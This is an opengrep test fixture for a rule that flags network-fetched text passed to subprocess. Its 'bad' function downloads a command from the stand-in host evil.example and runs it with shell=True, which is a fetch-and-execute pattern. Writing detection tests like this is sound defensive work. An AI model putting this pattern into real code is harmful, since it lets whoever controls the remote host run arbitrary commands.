# opengrep --test fixtures for setup_net_to_subprocess.
# Lines tagged `ruleid:` MUST match; `ok:` MUST NOT.
import subprocess

import requests


def bad():
    cmd = requests.get("http://evil.example/cmd").text
    # ruleid: setup_net_to_subprocess
    subprocess.run(cmd, shell=True)


def ok():
    # ok: setup_net_to_subprocess
    subprocess.run(["ls", "-la"])
